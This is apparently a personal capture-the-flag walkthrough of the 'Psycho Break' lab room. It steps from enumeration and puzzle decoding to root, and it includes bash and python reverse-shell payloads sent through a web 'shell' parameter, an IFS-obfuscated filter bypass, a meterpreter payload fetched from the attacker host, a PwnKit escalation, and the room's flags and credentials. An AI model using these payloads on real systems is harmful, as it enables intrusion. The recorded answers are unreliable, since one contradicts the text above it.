@@ -1,0 +1,840 @@
+PSYCHO BREAK.
+
+
+
+
+[>>> TASK 1: RECON]
+[1.1. DEPLOY THE MACHINE]
+Nothing to answer here.
+
+
+
+[1.2. HOW MANY PORTS ARE OPEN?]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.107.148
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5a
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+[ANSWER]
+3
+
+
+
+[1.3. WHAT IS THE OPERATING SYSTEM THAT RUNS ON THE TARGET MACHINE?]
+[ANSWER (based on last output)]
+Ubuntu
+
+
+
+
+[>>> TASK 2: WEB]
+[2.1. KEY TO THE LOCKER ROOM]
+[ACTION: explore http://10.10.107.148/]
+We get an introduction to the room.
+No clues in clear text.
+I found something in source code.
+[OUTPUT]
+<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
+
+
+[ACTION: explore http://10.10.107.148/sadistRoom/]
+[OUTPUT]
+Sebastian Found a key to the locker room. Click here to get the key.
+Key to locker Room => 532219a04ab7a02b56faafbec1a4c1ea
+[ANSWER]
+532219a04ab7a02b56faafbec1a4c1ea
+
+
+
+[2.2. KEY TO ACCESS THE MAP]
+[NOTE]
+Knowing we have the key for the locker room and the url syntax for the sadist room directory was sadistRoom, i'll try to visit http://10.10.107.148/lockerRoom/.
+[ACTION: explore http://10.10.107.148/lockerRoom/]
+[OUTPUT]
+Sebastian is hiding inside a locker to make it harder for the sadist to find him. While Sebastian was inside the locker he found a note. That looks like a map of some kind.
+Decode this piece of text "Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv" and get the key to access the map
+Click here to veiw the map ...
+[NOTE]
+Redirects to http://10.10.107.148/map.php.
+
+
+[NOTE]
+Juding by the lack of characters, it looks like some variation of rot.
+[ACTION: decode Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv]
+Turns out it isn't rot (no rot decode makes sense).
+After some testing, I found out it is using atbash cipher.
+Used https://www.boxentriq.com/code-breaking/atbash-cipher.
+[OUPTUT]
+Grant_me_access_to_the_map_please
+
+
+[ACTION: use map key in http://10.10.107.148/map.php]
+[OUTPUT]
+Here is the map
+1. Sadist Room
+2. Locker Room
+3. Safe Heaven
+4. The Abandoned Room
+[ANSWER]
+Grant_me_access_to_the_map_please
+
+
+
+[2.3. THE KEEPER KEY]
+[ACTION: explore http://10.10.107.148/SafeHeaven/]
+No clues in clear text.
+Found something in source code.
+[OUTPUT]
+<!-- I think I'm having a terrible nightmare. Search through me and find it ... -->
+
+
+[ACTION: explore http://10.10.107.148/abandonedRoom/]
+Enter Keeper Key To Proceed to Abandoned Room
+[NOTE]
+Looks like we are missing something from the safeheaven room.
+
+
+[NOTE]
+Since there is no clue towards the key in the source itself, ill try to run some metadata and steganography tools on the images displayed.
+If that doesn't work, ill enumerate directories.
+[ACTION: run exiftool on images]
+exiftool imagename.jpg
+[NOTE]
+No useful output.
+
+
+[NOTE]
+Same output on all 3 images.
+[ACTION: run binwalk on images]
+binwalk imagename.jpg
+[OUTPUT]
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+
+[NOTE]
+Same output on all 3 images.
+[ACTION: steghide extract passwordless]
+steghide extract -sf imagename.jpg
+[OUTPUT]
+steghide: could not extract any data with that passphrase!
+
+
+[ACTION: gobuster common directory scan]
+gobuster dir -u http://10.10.107.148/SafeHeaven/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/imgs                 (Status: 301) [Size: 324] [--> http://10.10.107.148/SafeHeaven/imgs/]
+/index.php            (Status: 200) [Size: 1299]
+[NOTE]
+Now hidden image on http://10.10.107.148/SafeHeaven/imgs/.
+
+
+[ACTION: gobuster directory scan with medium size list]
+gobuster dir -u http://10.10.107.148/SafeHeaven/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+[NOTE]
+No useful output.
+
+
+[ACTION: gobuster medium file scan]
+gobuster dir -u http://10.10.107.148/SafeHeaven/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+[NOTE]
+No useful output.
+
+
+[ACTION: another gobuster medium directory scan]
+List from beginning:
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+List from end:
+tac /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt > reversed.txt
+gobuster dir -u http://10.10.107.148/SafeHeaven/ -w reversed.txt
+[OUTPUT]
+/keeper               (Status: 301) [Size: 326] [--> http://10.10.107.148/SafeHeaven/keeper/]
+[NOTE]
+It took very long, but finally we found a new directory.
+
+
+[ACTION: explore http://10.10.107.148/SafeHeaven/keeper/]
+[OUTPUT]
+The Keeper
+Meet The Keeper ...
+Escape Keeper
+
+
+[NOTE]
+I pressed the escape keeper button.
+[ACTION: explore http://10.10.107.148/SafeHeaven/keeper/escapefromkeeper.php]
+Save Yourself !!!
+Enter the real location shown in the image given below in the input field and press enter. Find it out quickly before the time runs out !!!
+**. ********* **********
+Time You Got
+1 M 34 S
+
+
+[ACTION: run google lense on the image]
+[OUTPUT]
+st. augustine lighthouse
+
+
+[ACTION: input the name into the field]
+[OUPTUT]
+You Got The Keeper Key !!!
+Here is your key : 48ee41458eb0b43bf82b986cecf3af01
+[ANSWER]
+48ee41458eb0b43bf82b986cecf3af01
+
+
+	
+[2.4. WHAT IS THE FILENAME OF THE TEXT FILE (WITHOUT THE FILE EXTENSION)]
+[ACTION: visit http://10.10.107.148/abandonedRoom/ and use key]
+[OUTPUT]
+Abandoned Room
+So when Sebastian was walking along the dark lonely pathway towards what seems to be the exit door. He heard Something. Some noise was coming from over there where there is a body laying on the floor. So he went to investigate.
+Go Further
+
+
+[NOTE]
+Redirected to http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php
+[ACTION: click go further]
+[OUTPUT]
+Meet Laura the Spiderlady
+RUN. RUN. Runn Get out of here !!!
+1 M 42 S
+
+
+[ACTION: inspect source]
+[OUTPUT]
+<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->
+<!-- To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) -->
+
+
+[ACTION: attempt to spawn rev shell]
+1. Start listener:
+nc -lnvp 4444
+2. Connect via url command:
+http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.23.25.109%2F4444+0%3E%261%27
+[NOTE]
+Netcat caught no shell.
+After running a test curl (curl "http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?cmd=id"), I realize the cmd parameter is ignored.
+
+
+[ACTION: gobuster directory scan on previous directory]
+gobuster dir -u http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html
+[NOTE]
+No useful output.
+
+
+[NOTE]
+After some more attempts at enumerating, I decided to test parameters other than cmd to run commands.
+shell was succesful.
+[ACTION: run old rev shell command again]
+Visit: http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.23.25.109%2F4444+0%3E%261%27
+[OUTPUT]
+Command Not Permitted !!!
+
+
+[ACTION: attempt python shell]
+Visit: http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=python3+-c+%27import+socket,subprocess,os;s=socket.socket();s.connect((%2210.23.25.109%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22])%27
+[OUTPUT]
+Command Not Permitted !!!
+
+
+[ACTION: attempt obfuscated bash]
+New payload: bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.23.25.109/4444${IFS}0>&1'
+Url-encoded: bash%24%7BIFS%7D-c%24%7BIFS%7D%27bash%24%7BIFS%7D-i%24%7BIFS%7D%3E%26%24%7BIFS%7D%2Fdev%2Ftcp%2F10.23.25.109%2F4444%24%7BIFS%7D0%3E%261%27
+Visit: http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=bash%24%7BIFS%7D-c%24%7BIFS%7D%27bash%24%7BIFS%7D-i%24%7BIFS%7D%3E%26%24%7BIFS%7D%2Fdev%2Ftcp%2F10.23.25.109%2F4444%24%7BIFS%7D0%3E%261%27
+[OUTPUT]
+Command Not Permitted !!!
+
+
+[ACTION: run ls]
+http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls
+[OUTPUT]
+assets dead.php herecomeslara.php index.php script.js
+
+
+[ACTION: run ls ..]
+http://10.10.107.148/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls%20..
+[OUTPUT]
+680e89809965ec41e64dc7e447f175ab be8bc662d1e36575a52da40beba38275 index.php
+[NOTE]
+New directory: 680e89809965ec41e64dc7e447f175ab
+
+
+[ACTION: explore http://10.10.107.148/abandonedRoom/680e89809965ec41e64dc7e447f175ab/]
+[OUTPUT]
+Index of /abandonedRoom/680e89809965ec41e64dc7e447f175ab
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	helpme.zip	2020-07-09 13:52	26K	 
+[TXT]	you_made_it.txt	2020-07-22 01:22	62	 
+Apache/2.4.18 (Ubuntu) Server at 10.10.107.148 Port 80
+
+
+[ACTION: explore http://10.10.107.148/abandonedRoom/680e89809965ec41e64dc7e447f175ab/you_made_it.txt]
+You made it. Escaping from Laura is not easy, good job .... 
+[ANSWER]
+you_made_it
+
+
+
+
+[>>> TASK 4: HELP MEE]
+[4.1. WHO IS LOCKED UP IN THE CELL?]
+[ACTION: explore http://10.10.107.148/abandonedRoom/680e89809965ec41e64dc7e447f175ab/helpme.zip]
+Zip downloaded.
+
+
+[ACTION: open helpme.zip]
+cd Downloads
+unzip helpme.zip
+[OUTPUT]
+Archive:  helpme.zip
+  inflating: helpme.txt              
+  inflating: Table.jpg
+
+
+[ACTION: display helpme]
+cat helpme.txt
+[OUTPUT]
+From Joseph,
+
+Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of 
+this cell.
+[ANSWER]
+joseph
+
+
+
+[4.2. THERE IS SOMETHING WEIRD WITH THE .WAV FILE. WHAT DOES IT SAY?]
+[ACTION: view table]
+xdg-open Table.jpg
+[OUTPUT]
+App error:
+Some files could not be opened: see the text logs for details.
+Terminal error:
+** Message: 08:04:51.103: Could not open file 'file:///home/user0/Downloads/Table.jpg': Unsupported mime type
+
+
+[ACTION: check table file type]
+file Table.jpg
+[OUTPUT]
+Table.jpg: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jul 07 2020 22:37:08, uncompressed size 25399, method=deflate
+[NOTE]
+Turns out table is a zip disguised as an image.
+Thats why it couldn't be displayed.
+
+
+[ACTION: rename extension]
+mv Table.jpg Table.zip
+
+
+[ACTION: unzip to folder table]
+unzip Table.zip -d table
+[OUTPUT]
+Archive:  Table.zip
+  inflating: table/Joseph_Oda.jpg    
+  inflating: table/key.wav  
+
+
+[ACTION: view joseph_oda]
+cd table
+xdg-open Joseph_Oda.jpg
+[OUTPUT]
+A picture of some guy (I guess joseph).
+If we get no clues via the key.wav, we will have to run image inspection tools against this file.
+
+
+[ACTION: listen to key]
+aplay key.wav
+[NOTE]
+A weird beeping audio plays.
+Probably something like morse code or similar.
+
+
+[ACTION: install digital decoder tool]
+sudo apt install multimon-ng
+
+
+[ACTION: convert key to raw format and run multimon]
+sox key.wav -r 22050 -e signed -b 16 -c 1 key.raw
+multimon-ng -a MORSE_CW -t raw key.raw
+[OUTPUT]
+multimon-ng 1.3.1
+  (C) 1996/1997 by Tom Sailer HB9JNX/AE4WA
+  (C) 2012-2024 by Elias Oenal
+Available demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX FLEX_NEXT EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPE
+Enabled demodulators: MORSE_CW
+SHOWM
+[NOTE]
+Playing with the thm answer length and some common sense, we find the answer: showme.
+[ANSWER]
+shomwe
+
+
+
+[4.3. WHAT IS THE FTP USERNAME]
+[NOTE]
+[ACTION: attempt anon login to ftp]
+ftp 10.10.107.148
+anonymous
+Press enter
+[OUTPUT]
+530 Login incorrect.
+ftp: Login failed
+[NOTE]
+The answer is the user we just found... joseph
+[ANSWER]
+joseph
+
+
+
+[4.4. WHAT IS THE FTP USER PASSWORD]
+[NOTE]
+Trying SHOWME and showme rendered useless.
+I'll try to bruteforce the login.
+[ACTION: bruteforce joseph ftp login]
+hydra -l joseph -P ~/thm/rockyou.txt -s 21 ftp://10.10.107.148
+[NOTE]
+It is taking too long, so this probably isn't the right procedure.
+While waiting I ran steganography tools on Joseph_Oda, but found nothing.
+
+
+[NOTE]
+We got SHOWME, what looks like a password.
+I'll try to run steghide with it on  Joseph_Oda.
+Previously, I ran it passwordless.
+[ACTION: run steghide with decoded string as password]
+steghide extract -sf Joseph_Oda.jpg
+[OUTPUT]
+wrote extracted data to "thankyou.txt".
+
+
+[ACTION: display thankyou]
+cat thankyou.txt
+[OUTPUT]
+From joseph,
+
+Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help 
+Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. 
+But for some reason there is my name listed on the note which I don't have a clue.
+
+	   --------------------------------------------
+        //						\\
+	||	(NOTE) FTP Details			||
+	||      ==================			||
+	||						||
+	||	USER : joseph				||
+	||	PASSWORD : intotheterror445		||
+	||						||
+	\\						//
+	   --------------------------------------------
+	
+
+Good luck, Be carefull !!!
+[ANSWER]
+intotheterror445
+
+
+
+ 
+[TASK 4: CRACK IT OPEN]
+[4.1. THE KEY USED BY THE PROGRAM]
+[NOTE]
+Creds: joseph|intotheterror445
+[ACTION: connect to ftp server as joseph]
+ftp joseph@10.10.107.148
+[OUTPUT]
+Connected to 10.10.107.148.
+220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.107.148]
+331 Password required for joseph
+Password: 
+230 User joseph logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+
+
+[ACTION: list content]
+dir
+[OUTPUT]
+150 Opening ASCII mode data connection for file list
+-rwxr-xr-x   1 joseph   joseph   11641688 Aug 13  2020 program
+-rw-r--r--   1 joseph   joseph        974 Aug 13  2020 random.dic
+
+
+[ACTION: download all files (in current directory)]
+prompt
+mget *
+exit
+
+
+[ACTION: display random]
+cat random
+[OUTPUT]
+000000
+111111
+123123
+123321
+1234
+12345
+123456
+1234567
+12345678
+....
+[NOTE]
+Looks like a password list.	
+
+
+[ACTION: check extension of program]
+file program
+[OUTPUT]
+program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped
+
+
+[ACTION: run program]
+chmod +x program
+./program
+[OUTPUT]
+[+] Usage
+
+./program <word>
+
+
+[ACTION: test random word value]
+./program test13201222a
+[OUTPUT]
+test13201222a => Incorrect
+
+
+[NOTE]
+Now it is very clear that we need to test the .dic file against this.
+[ACTION: create bruteforce.sh]
+#!/bin/bash
+
+# Ensure the program is executable
+chmod +x ./program
+
+# Loop through each password in random.dic
+while IFS= read -r password; do
+    output=$(./program "$password")
+    
+    # If output is NOT "=> Incorrect", show it
+    if [[ "$output" != *"=> Incorrect"* ]]; then
+        echo "$output"
+    fi
+done < random.dic
+
+
+[ACTION: run bruteforce script]
+chmod +x bruteforce.sh
+./bruteforce.sh
+[NOTE]
+We get no output (?).
+
+
+[ACTION: check if random has whitespaces]
+cat -A random.dic | head
+[OUTPUT]
+000000^M$
+111111^M$
+123123^M$
+123321^M$
+1234^M$
+12345^M$
+123456^M$
+1234567^M$
+12345678^M$
+123456789^M$
+
+
+[ACTION: clean random]
+dos2unix random.dic
+
+
+[ACTION: run bruteforce again]
+./bruteforce.sh
+[OUTPUT]
+kidman => Correct
+
+Well Done !!!
+Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
+[ANSWER]
+kidman
+
+
+
+[4.2. WHAT DO THE CRAZY LONG NUMBERS MEAN WHEN THERE DECRYPTED]
+[NOTE]
+Judging by the repetitons and spacing between digits, it looks like t9 (old phones keypad) mapping.
+[ACTION: decode 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33]
+Used https://mrmatt.net/?v=T9
+[OUTPUT]
+KIDMANSPASSWORDISSOSTRANGE
+[ANSWER]
+KIDMANSPASSWORDISSOSTRANGE
+
+
+
+
+[>>> TASK 5: GO CAPTURE THE FLAG]
+[5.1. USER.TXT]
+[NOTE]
+In the last task we got what could be a cred pair: kidman|KIDMANSPASSWORDISSOSTRANGE.
+Only service we haven't tested yet is ssh.
+Also, there really isn't any other clue or path left to explore.
+[ACTION: ssh as kidman]
+ssh kidman@10.10.107.148
+[OUTPUT]
+kidman@evilwithin:~$ 
+
+
+[ACTION: display user flag]
+cat user.txt
+[OUTPUT]
+4C72A4EF8E6FED69C72B4D58431C4254
+[ANSWER]
+4C72A4EF8E6FED69C72B4D58431C4254
+
+
+
+[5.2. ROOT.TXT]
+[ACTION: display ids and groups of current user]
+id
+[OUTPUT]
+uid=1002(kidman) gid=1002(kidman) groups=1002(kidman)
+
+
+[ACTION: list current directory]
+ls -la
+[OUTPUT]
+drwxr-xr-x 4 kidman kidman 4096 Aug 13  2020 .
+drwxr-xr-x 5 root   root   4096 Jul 13  2020 ..
+-rw------- 1 kidman kidman    1 Aug 13  2020 .bash_history
+-rw-r--r-- 1 kidman kidman  220 Jul 13  2020 .bash_logout
+-rw-r--r-- 1 kidman kidman 3771 Aug 13  2020 .bashrc
+drwx------ 2 kidman kidman 4096 Jul 13  2020 .cache
+drwxrwxr-x 2 kidman kidman 4096 Jul 13  2020 .nano
+-rw-r--r-- 1 kidman kidman  655 Jul 13  2020 .profile
+-rw-rw-r-- 1 kidman kidman  264 Aug 13  2020 .readThis.txt
+-rw-r--r-- 1 root   root     25 Aug  3 12:32 .the_eye.txt
+-rw-rw-r-- 1 kidman kidman   33 Jul 13  2020 user.txt
+
+
+[ACTION: display the_eye]
+cat .the_eye.txt
+[OUTPUT]
+No one can hide from me.
+
+
+[ACTION: display readThis]
+cat .readThis.txt
+[OUTPUT]
+uC@> z:5>2?i
+
+%96 E9:?8 x 2> 23@FE E@ E6== D@ :D E@A D64C6E] }@ @?6 5@6D?VE <?@H 23@FE E9:D] xEVD E96 #FG:<VD 6J6] }@ @?6 42? 9:56 2H2J 7C@> :E] qFE x 42? E6== J@F @?6 E9:?8 D62C49 7@C E96 DEC:?8 YE9606J60@70CFG:<Y ] *@F 8@E E@ 96=A $632DE:2? 56762E #FG:< ]]]
+[NOTE]
+I can't figure out (at least quickly) if this is encoding, and if so, its type.
+I'll move on.
+
+
+[ACTION: check sudo permissions]
+sudo -l
+[OUTPUT]
+Sorry, user kidman may not run sudo on evilwithin.
+
+
+[ACTION: display suid binaries]
+find / -type f -perm -4000 2>/dev/null
+[OUTPUT]
+/bin/fusermount
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping
+/bin/ping6
+/bin/umount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/gpasswd
+^[[D/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+
+
+[ACTION: display fusermount version]
+fusermount --v
+[OUTPUT]
+fusermount version: 2.9.4
+[NOTE]
+We are in range (2.9.3-2.9.15) to exploit cve-2015-3202 (https://www.exploit-db.com/exploits/37089).
+However, it is pretty useless, since it requires a root login to trigger the privesc.
+
+
+[ACTION: display ntfs-3g version]
+ntfs-3g --version
+[OUTPUT]
+ntfs-3g 2015.3.14AR.1 integrated FUSE 28
+[NOTE]
+Patch for CVE-2017-0358 is much older than the installed version.
+We will try to run https://www.rapid7.com/db/modules/exploit/linux/local/ntfs3g_priv_esc/.
+
+
+[NOTE]
+We need a session with user access (in metasploit).
+So before runnning the module we need to create said session.
+We need to convert our ssh session into a meterpreter/metasploit session.
+[ACTION: generate payload]
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.23.25.109 LPORT=4444 -f elf > meterpreter.elf
+
+
+[ACTION: start python server]
+python3 -m http.server 80
+
+
+[ACTION: download payload to machine]
+wget http://10.23.25.109/meterpreter.elf -O meterpreter.elf
+
+
+[ACTION: start metasploit listener]
+msfconsole
+use exploit/multi/handler
+set LHOST 10.23.25.109
+set LPORT 4444
+exploit
+
+
+[ACTION: trigger payload]
+chmod +x meterpreter.elf
+./meterpreter.elf
+[OUTPUT]
+Segmentation fault (core dumped)
+[NOTE]
+When running msfvenom I allowed it to autoselect architecture as x64.
+
+
+[ACTION: check machine architecture]
+uname -m
+[OUTPUT]
+x86_64
+
+
+[ACTION: create proper payload]
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.23.25.109 LPORT=4444 --platform linux -f elf -o meterpreter.elf
+On metasploit:
+set payload linux/x64/meterpreter_reverse_tcp
+[NOTE]
+Then send as before.
+
+
+[ACTION: run]
+Local:
+exploit
+Machine:
+./meterpreter.elf
+[OUTPUT]
+[*] Meterpreter session 8 opened (10.23.25.109:4444 -> 10.10.107.148:41630) at 2025-08-03 10:01:01 +0200
+
+
+[ACTION: run ntfs3g_priv_esc module]
+background
+use exploit/linux/local/ntfs3g_priv_esc
+set SESSION 8
+set LHOST 10.23.25.109
+set LPORT 4444
+run
+[OUTPUT]
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[-] Version installed not vulnerable: ii  ntfs-3g        1:2015.3.14AR.1-1ubuntu0.1 amd64        read/write NTFS driver for FUSE
+[-] Exploit aborted due to failure: not-vulnerable: Target not vulnerable! punt!
+[*] Exploit completed, but no session was created.
+[NOTE]
+Looks like even though the version is older, its patched...
+
+
+[NOTE]
+I'll attempt to exploit pkexec (cve-2021-4034) following https://www.rapid7.com/db/modules/exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec/
+[ACTION: exploit pkexec]
+set LHOST 10.23.25.109
+sest SESSION 8
+exploit
+[OUTPUT]
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] Verify cleanup of /tmp/.ufsgwv
+[+] The target is vulnerable.
+[*] Writing '/tmp/.ycdije/rztppvm/rztppvm.so' (540 bytes) ...
+[!] Verify cleanup of /tmp/.ycdije
+[*] Sending stage (3045380 bytes) to 10.10.107.148
+[+] Deleted /tmp/.ycdije/rztppvm/rztppvm.so
+[+] Deleted /tmp/.ycdije/.jymfpg
+[+] Deleted /tmp/.ycdije
+[*] Meterpreter session 9 opened (10.23.25.109:4444 -> 10.10.107.148:41632) at 2025-08-03 10:07:02 +0200
+
+meterpreter > 
+
+
+[ACTION: verify root]
+getuid
+[OUTPUT]
+Server username: root
+
+
+[ACTION: display root flag]
+shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+cat /root/root.txt
+[OUTPUT]
+BA33BDF5B8A3BFC431322F7D13F3361E
+[ANSWER]
+BA33BDF5B8A3BFC431322F7D13F3361E
+
+
+[5.3. [BONUS] DEFEAT RUVIK]
+[NOTE]
+Hint says to remove his account.
+
+
+[ACTION: display user accounts]
+awk -F: '$3 >= 1000 {print $1}' /etc/passwd
+[OUTPUT]
+nobody
+joseph
+kidman
+ruvik
+
+
+[ACTION: delete ruvik]
+sudo userdel -r ruvik
+[OUTPUT]
+userdel: ruvik mail spool (/var/mail/ruvik) not found
+
+
+[ACTION: verify deletion]
+id ruvik
+[OUTPUT]
+id: 'ruvik': no such user
+
+
+
+
+[>>> TASK 6: COPYRIGHT MATERIAL]
+[6.1. CONGRATULATIONS. YOU'VE COMPLETED THE EVIL-WITHIN. THIS IS THE FIRST ROOM I'VE EVER CREATED SO IF YOU ENJOYED IT PLEASE GIVE ME A FOLLOW UP ON TWITTER (https://twitter.com/ShalindaFd0) AND SEND ME YOUR FEEDBACK :).]
+Nothing to answer here.
